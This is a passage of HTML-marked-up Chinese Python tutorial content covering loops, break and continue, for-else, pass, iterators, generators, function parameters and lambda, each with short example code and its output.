punctuation">[</span><span class="token string">'Google'</span><span class="token punctuation">,</span> <span class="token string">'Baidu'</span><span class="token punctuation">,</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Taobao'</span><span class="token punctuation">,</span> <span class="token string">'QQ'</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''0125147-10-50-900 Google1 Baidu2 Runoob3 Taobao4 QQ[0, 1, 2, 3, 4]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">while</span> n <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    n <span class="token operator">-=</span> <span class="token number">1</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'循环结束。'</span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">while</span> n <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span>    n <span class="token operator">-=</span> <span class="token number">1</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'循环结束。'</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''43循环结束。4310循环结束。'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="for-else"><a href="#for-else" class="headerlink" title="for-else"></a>for-else</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> n <span class="token operator">%</span> x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token string">'等于'</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> n<span class="token operator">//</span>x<span class="token punctuation">)</span>            <span class="token keyword">break</span>  <span class="token comment"># 直接跳出第一个循环，不执行else</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token comment"># 循环中没有找到元素</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> <span class="token string">' 是质数'</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''2  是质数3  是质数4 等于 2 * 25  是质数6 等于 2 * 37  是质数8 等于 2 * 49 等于 3 * 3'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="pass语句"><a href="#pass语句" class="headerlink" title="pass语句"></a>pass语句</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> letter <span class="token keyword">in</span> <span class="token string">'Runoob'</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'o'</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'执行 pass 块'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'当前字母 :'</span><span class="token punctuation">,</span> letter<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Good bye!"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''当前字母 : R当前字母 : u当前字母 : n执行 pass 块当前字母 : o执行 pass 块当前字母 : o当前字母 : bGood bye!'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pass 不做任何事情，一般用做占位语句</p><h2 id="迭代器和生成器"><a href="#迭代器和生成器" class="headerlink" title="迭代器和生成器"></a>迭代器和生成器</h2><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>迭代器两个基本函数<code>iter()</code> <code>next()</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>it <span class="token operator">=</span> <span class="token builtin">iter</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>  <span class="token comment"># 创建迭代器对象</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 输出迭代器的下一个元素</span><span class="token comment"># 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 2</span><span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>it <span class="token operator">=</span> <span class="token builtin">iter</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>  <span class="token comment"># 创建迭代器对象</span><span class="token keyword">for</span> x <span class="token keyword">in</span> it<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token comment"># 1 2 3 4</span>    <span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>it <span class="token operator">=</span> <span class="token builtin">iter</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">)</span>  <span class="token comment"># 创建迭代器对象</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> StopIteration<span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''1234'''</span><span class="token triple-quoted-string string">'''121 2 3 4 1234'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="创建一个迭代器"><a href="#创建一个迭代器" class="headerlink" title="创建一个迭代器"></a>创建一个迭代器</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyNumbers</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">__iter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">return</span> self   <span class="token keyword">def</span> <span class="token function">__next__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> self<span class="token punctuation">.</span>a    self<span class="token punctuation">.</span>a <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> x myclass <span class="token operator">=</span> MyNumbers<span class="token punctuation">(</span><span class="token punctuation">)</span>myiter <span class="token operator">=</span> <span class="token builtin">iter</span><span class="token punctuation">(</span>myclass<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>myiter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>myiter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>myiter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>myiter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>myiter<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''12345'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="StopIteration"><a href="#StopIteration" class="headerlink" title="StopIteration"></a>StopIteration</h3><p>StopIteration 异常用于标识迭代的完成，防止出现无限循环的情况</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">MyNumbers</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">__iter__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">return</span> self   <span class="token keyword">def</span> <span class="token function">__next__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> self<span class="token punctuation">.</span>a <span class="token operator">&lt;=</span> <span class="token number">20</span><span class="token punctuation">:</span>      x <span class="token operator">=</span> self<span class="token punctuation">.</span>a      self<span class="token punctuation">.</span>a <span class="token operator">+=</span> <span class="token number">1</span>      <span class="token keyword">return</span> x    <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">raise</span> StopIteration myclass <span class="token operator">=</span> MyNumbers<span class="token punctuation">(</span><span class="token punctuation">)</span>myiter <span class="token operator">=</span> <span class="token builtin">iter</span><span class="token punctuation">(</span>myclass<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> myiter<span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p>使用<code>yield()</code>函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># 生成器函数 - 斐波那契</span>    a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> counter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>counter <span class="token operator">&gt;</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>             <span class="token keyword">return</span>        <span class="token keyword">yield</span> a        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a <span class="token operator">+</span> b        counter <span class="token operator">+=</span> <span class="token number">1</span>f <span class="token operator">=</span> fibonacci<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment"># f 是一个迭代器，由生成器返回生成</span> <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> StopIteration<span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token triple-quoted-string string">'''0 1 1 2 3 5 8 13 21 34 55 '''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数-4"><a href="#函数-4" class="headerlink" title="函数"></a>函数</h2><ol><li>函数代码块以def关键字开头，厚街函数标识符名称和圆括号()</li><li>传入的参数和自变量放在圆括号内</li><li>函数内容以冒号起始，并且缩进</li><li>return [表达式] 结束函数并返回值</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 计算面积函数</span><span class="token keyword">def</span> <span class="token function">area</span><span class="token punctuation">(</span>width<span class="token punctuation">,</span> height<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> width <span class="token operator">*</span> height <span class="token keyword">def</span> <span class="token function">print_welcome</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Welcome"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span> print_welcome<span class="token punctuation">(</span><span class="token string">"Runoob"</span><span class="token punctuation">)</span>w <span class="token operator">=</span> <span class="token number">4</span>h <span class="token operator">=</span> <span class="token number">5</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"width ="</span><span class="token punctuation">,</span> w<span class="token punctuation">,</span> <span class="token string">" height ="</span><span class="token punctuation">,</span> h<span class="token punctuation">,</span> <span class="token string">" area ="</span><span class="token punctuation">,</span> area<span class="token punctuation">(</span>w<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">print_welcome<span class="token punctuation">(</span><span class="token string">"Runoob"</span><span class="token punctuation">)</span>area<span class="token punctuation">(</span>w<span class="token punctuation">,</span> h<span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><h4 id="不可变类型"><a href="#不可变类型" class="headerlink" title="不可变类型"></a>不可变类型</h4><p>number，string，tuples</p><ol><li>先赋值<code>a = 2</code>，再赋值<code>a = 5</code>，后者覆盖前者，相当于新生成一个值，地址变了</li><li>传递的参数值不会影响原值，函数内部重新赋值会生成一个的对象，不会影响函数外的值</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 指向的是同一个对象</span>    a<span class="token operator">=</span><span class="token number">10</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 一个新对象</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>change<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''140721657271968-140721657271968140721657272256'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="可变类型"><a href="#可变类型" class="headerlink" title="可变类型"></a>可变类型</h4><p>list，dictionary，set</p><ol><li>列表赋值，然后再修改元素，列表地址不会改变，还是原来那个列表</li><li>传入函数的这类参数，在函数内修改会影响到函数外的值</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 可写函数说明</span><span class="token keyword">def</span> <span class="token function">changeme</span><span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""修改传入的列表"""</span>    mylist<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"函数内取值: "</span><span class="token punctuation">,</span> mylist<span class="token punctuation">)</span>    <span class="token keyword">return</span><span class="token comment"># 调用changeme函数</span>mylist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span>changeme<span class="token punctuation">(</span>mylist<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"函数外取值: "</span><span class="token punctuation">,</span> mylist<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''函数内取值:  [10, 20, 30, [1, 2, 3, 4]]函数外取值:  [10, 20, 30, [1, 2, 3, 4]]'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><h4 id="必需参数"><a href="#必需参数" class="headerlink" title="必需参数"></a>必需参数</h4><p>必需参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#可写函数说明</span><span class="token keyword">def</span> <span class="token function">printme</span><span class="token punctuation">(</span> <span class="token builtin">str</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"打印任何传入的字符串"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token comment"># 调用 printme 函数，不加参数会报错</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'test'</span>printme<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h4><p>关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值，使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#可写函数说明</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> age <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"打印任何传入的字符串"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"名字: "</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"年龄: "</span><span class="token punctuation">,</span> age<span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token comment">#调用printinfo函数</span>printinfo<span class="token punctuation">(</span> age<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"runoob"</span> <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h4><p>调用函数时，如果没有传递参数，则会使用默认参数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#可写函数说明</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> age <span class="token operator">=</span> <span class="token number">35</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"打印任何传入的字符串"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"名字: "</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"年龄: "</span><span class="token punctuation">,</span> age<span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token comment">#调用printinfo函数</span>printinfo<span class="token punctuation">(</span> age<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"runoob"</span> <span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"------------------------"</span><span class="token punctuation">)</span>printinfo<span class="token punctuation">(</span> name<span class="token operator">=</span><span class="token string">"runoob"</span> <span class="token punctuation">)</span><span class="token triple-quoted-string string">'''名字:  runoob年龄:  50------------------------名字:  runoob年龄:  35'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">functionname</span><span class="token punctuation">(</span><span class="token punctuation">[</span>formal_args<span class="token punctuation">,</span><span class="token punctuation">]</span> <span class="token operator">*</span>var_args_tuple <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"函数_文档字符串"</span>   function_suite   <span class="token keyword">return</span> <span class="token punctuation">[</span>expression<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">functionname</span><span class="token punctuation">(</span><span class="token punctuation">[</span>formal_args<span class="token punctuation">,</span><span class="token punctuation">]</span> <span class="token operator">**</span>var_args_dict <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"函数_文档字符串"</span>   function_suite   <span class="token keyword">return</span> <span class="token punctuation">[</span>expression<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>加了星号 ***** 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数</li><li>在函数调用时没有指定参数，它就是一个空元组</li><li>加了两个星号 *<strong>*</strong> 的参数会以字典的形式导入</li><li>如果单独出现星号 ***** 后的参数必须用关键字传入</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 可写函数说明</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> <span class="token operator">*</span>vartuple <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"打印任何传入的参数"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"输出: "</span><span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>   <span class="token keyword">for</span> var <span class="token keyword">in</span> vartuple<span class="token punctuation">:</span>      <span class="token keyword">print</span> <span class="token punctuation">(</span>var<span class="token punctuation">)</span>   <span class="token keyword">return</span> <span class="token comment"># 调用printinfo 函数</span>printinfo<span class="token punctuation">(</span> <span class="token number">10</span> <span class="token punctuation">)</span>printinfo<span class="token punctuation">(</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">50</span> <span class="token punctuation">)</span><span class="token triple-quoted-string string">'''输出: 10输出: 706050'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 可写函数说明</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> <span class="token operator">**</span>vardict <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"打印任何传入的参数"</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"输出: "</span><span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>   <span class="token keyword">print</span> <span class="token punctuation">(</span>vardict<span class="token punctuation">)</span> <span class="token comment"># 调用printinfo 函数</span>printinfo<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> a<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''输出: 1{'a': 2, 'b': 3}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><ol><li>使用 lambda 来创建匿名函数</li><li>lambda的主体是一个表达式，而不是一个代码块</li><li>lambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">lambda</span> <span class="token punctuation">[</span>arg1 <span class="token punctuation">[</span><span class="token punctuation">,</span>arg2<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>argn<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 可写函数说明</span><span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token keyword">lambda</span> arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">:</span> arg1 <span class="token operator">+</span> arg2 <span class="token comment"># 调用sum函数</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"相加后的值为 : "</span><span class="token punctuation">,</span> <span class="token builtin">sum</span><span class="token punctuation">(</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"相加后的值为 : "</span><span class="token punctuation">,</span> <span class="token builtin">sum</span><span class="token punctuation">(</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''相加后的值为 :  30相加后的值为 :  40'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="return语句"><a href="#return语句" class="headerlink" title="return语句"></a>return语句</h3><p><strong>return 